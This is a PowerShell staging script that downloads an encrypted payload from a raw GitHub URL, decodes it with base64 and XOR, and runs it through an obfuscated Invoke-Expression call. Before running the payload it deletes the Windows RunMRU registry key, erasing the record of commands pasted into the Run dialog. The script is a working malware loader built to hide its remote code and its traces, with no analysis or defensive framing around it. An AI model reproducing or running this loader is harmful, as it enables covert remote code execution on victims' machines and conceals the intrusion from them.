# ====================== Staging Post =============================

 function dojob {
    param ([string]$sec,[string]$bty)
    $ajd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sec))
    $asg = ""
    for ($i = 0; $i -lt $ajd.Length; $i++) {
        $osn = [int]$ajd[$i] -bxor [int]$bty[$i % $bty.Length]
        $asg += [char]$osn
    }
    return $asg
}
$k = "$k"
$t = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
$isn = dojob -sec $t -bty $k

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

$isn | i`ex
